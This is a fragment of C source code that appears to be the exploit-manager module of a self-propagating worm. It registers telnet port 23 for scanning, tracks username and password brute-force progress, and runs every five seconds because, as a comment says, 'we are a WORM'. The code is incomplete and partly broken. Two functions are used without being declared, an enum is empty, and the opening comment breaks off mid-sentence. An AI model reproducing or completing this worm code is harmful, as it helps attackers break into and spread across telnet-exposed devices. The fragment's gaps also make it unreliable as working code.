/*
exploit manager should control port scanning speeds, and queues for various included exploit
so the worm can 
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <list.h>
#include "structs.h"
#include "utils.h"
#include "telnet.h"
#include "portscan.h"

#define EXPLOIT_MODULE_ID 665

typedef char *(*ExpectCMD)(Modules *, Connection *, int *size);
int exploit_incoming(Modules *mptr, Connection *cptr, char *buf, int size);
int exploit_init(Modules **);


enum {
};

// telnet brute forcing doesnt need nearly as many functions..
ModuleFuncs exploit_funcs = { 
    NULL, NULL,
    &exploit_incoming,
    NULL,
    &exploit_main_loop,
    NULL, // no connect.. we're getting it passed over'
    &exploit_disconnect,
    NULL
};

Modules CLK_Exploit = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0, 1,
    // module ID
    EXPLOIT_MODULE_ID, 0,
    // port, state
    23, 0,
    // required 0, 0..  
    0, 0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    // we will run this every 5 seconds since we are a WORM
    5,
    // telnet functions
    &exploit_funcs, NULL,
    // no magic bytes for telnet
    NULL, 0
};

// customstate goes in connection->buf (for keeping track of brute force, etc)
typedef struct _custom_state {
    // what username are we on..
    int users;
    // what password are we on?
    int passwords;
    // seconds since last expect
    unsigned int ts;
    // are we completed? if we find ourselves inside.. then dont
    // continue to brute force..
    int complete;
} CustomState;

CustomState *CustomState_Ptr(Connection *cptr) {
    return (CustomState *)CustomPtr(cptr, sizeof(CustomState));    
}


// initialize the module
int exploit_init(Modules **_module_list) {
    Module_Add(_module_list, &CLK_Exploit);
    
    // add port 23 to port scanning.. and let it know
    // to adopt connections here after finding
    Portscan_Add(&CLK_Exploit, 23, 0);
    // enable the port scan of telnet..
    //Portscan_Enable(23, 1);
}
